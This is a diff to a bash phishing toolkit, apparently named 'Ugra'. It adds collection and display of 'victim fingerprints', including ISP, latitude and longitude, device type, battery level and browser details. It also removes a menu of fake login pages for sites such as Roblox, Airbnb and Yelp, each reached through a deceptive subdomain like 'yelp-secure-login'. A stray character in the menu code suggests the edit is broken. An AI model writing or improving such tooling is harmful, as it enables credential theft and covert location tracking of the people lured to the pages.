@@ -184,6 +184,13 @@ get_fingerprints() {
     City=$(grep -a 'City:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
     User_Agent=$(grep -a 'User-Agent:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
     OS_System=$(grep -a 'OS-System:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
+    ISP=$(grep -a 'ISP:.*' .www/fingerprints.txt | cut -d " " -f2- | tr -d '\r')
+    Latitude=$(grep -a 'Latitude:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
+    Longitude=$(grep -a 'Longitude:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
+    Device_Type=$(grep -a 'Device-Type:.*' .www/fingerprints.txt | cut -d " " -f2- | tr -d '\r')
+    Battery_Level=$(grep -a 'Battery-Level:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
+    Browser_Details=$(grep -a 'Browser-Details:.*' .www/fingerprints.txt | cut -d " " -f2- | tr -d '\r')
+    System_RAM=$(grep -a 'System-RAM:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Victim Fingerprints.. "
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${BLUE}$IP"
@@ -193,6 +200,13 @@ get_fingerprints() {
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} City: ${BLUE}$City"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} OS System: ${BLUE}$OS_System"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} ISP: ${BLUE}$ISP"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Latitude: ${BLUE}$Latitude"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Longitude: ${BLUE}$Longitude"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Device Type: ${BLUE}$Device_Type"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Battery Level: ${BLUE}$Battery_Level"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Browser Details: ${BLUE}$Browser_Details"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} System RAM: ${BLUE}$System_RAM"
 	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Saved in : ${MAGENTA}fingerprints.txt"
 	cat .www/fingerprints.txt >> fingerprints.txt
 }
@@ -1308,10 +1322,6 @@ attack() {
 			tunnel;;
 
 
-	   02)
-	        other_sites;;
-
-
 	   99)  menu;;
 
 
@@ -1323,137 +1333,6 @@ attack() {
 
 
 }
-
-
-
-
-other_sites() {
-
- { clear; header; echo; }
-
-   	cat <<- EOF
-		${GREEN}[${WHITE}1${GREEN}]${CYAN} Freefire
-		${GREEN}[${WHITE}2${GREEN}]${CYAN} Roblox
-		${GREEN}[${WHITE}3${GREEN}]${CYAN} Academia
-		${GREEN}[${WHITE}4${GREEN}]${CYAN} Airbnb
-		${GREEN}[${WHITE}5${GREEN}]${CYAN} Bigmuscle
-		${GREEN}[${WHITE}6${GREEN}]${CYAN} Doximity
-		${GREEN}[${WHITE}7${GREEN}]${CYAN} Flickr
-		${GREEN}[${WHITE}8${GREEN}]${CYAN} Hi5
-		${GREEN}[${WHITE}9${GREEN}]${CYAN} Issue
-		${GREEN}[${WHITE}10${GREEN}]${CYAN} NYtimes
-		${GREEN}[${WHITE}11${GREEN}]${CYAN} Pokemon Trainer
-		${GREEN}[${WHITE}12${GREEN}]${CYAN} WTsocial
-		${GREEN}[${WHITE}13${GREEN}]${CYAN} Yammer
-		${GREEN}[${WHITE}14${GREEN}]${CYAN} Yelp
-		${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu
-
-	EOF
-
-
-	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}
-
-	case $REPLY in
-
-	    1)
-			site="freefire"
-			subdomain='http://get-free-character-for-freefire-game'
-			tunnel;;
-
-
-	    2)
-			site="roblox"
-			subdomain='http://get-free-character-for-roblox-game'
-			tunnel;;
-
-
-	    3)
-			site="academia"
-			subdomain='http://academia-account-update-plan-free'
-			tunnel;;
-
-
-	    4)
-			site="airbnb"
-			subdomain='http://airbnb-account-upgrade-plan-free'
-			tunnel;;
-
-
-	    5)
-			site="bigmuscle"
-			subdomain='http://bigmuscle-account-update-plan-free'
-			tunnel;;
-
-
-	    6)
-			site="doximity"
-			subdomain='http://doximity-account-update-plan-free'
-			tunnel;;
-
-
-	    7)
-			site="flickr"
-			subdomain='http://flickr-account-upgrade-plan-pro-free'
-			tunnel;;
-
-
-	    8)
-			site="hi5"
-			subdomain='http://hi5-account-secure-login'
-			tunnel;;
-
-
-	    9)
-			site="issue"
-			subdomain='http://flickr-account-upgrade-plan-pro-free'
-			tunnel;;
-
-
-	    10)
-			site="nytimes"
-			subdomain='http://nytimes-account-upgrade-to-pro-free'
-			tunnel;;
-
-
-	    11)
-			site="pokemon"
-			subdomain='http://pokemon-update-account-plan-free'
-			tunnel;;
-
-
-	    12)
-			site="wtsocial"
-			subdomain='http://wtsocial-secure-login'
-			tunnel;;
-
-
-	    13)
-			site="yammer"
-			subdomain='http://yammer-secure-login'
-			tunnel;;
-
-
-	    14)
-			site="yelp"
-			subdomain='http://yelp-secure-login'
-			tunnel;;
-
-
-	   99) menu;;
-
-
-	   *)
-			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
-			{ sleep 0.7; other_sites;};;
-
-	esac
-
-
-}
-
-
-
-
 
 customize_sites()
 {
@@ -1517,7 +1396,7 @@ menu() {
 	    1) attack;;
 
 	    help) help;;
-
+S
 		0)
 		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using Ugra "${WHITE}
 		sleep 2
@@ -1543,7 +1422,6 @@ control_c()
 
 
 trap control_c SIGINT
-
 
 
 check_os_and_install_packages
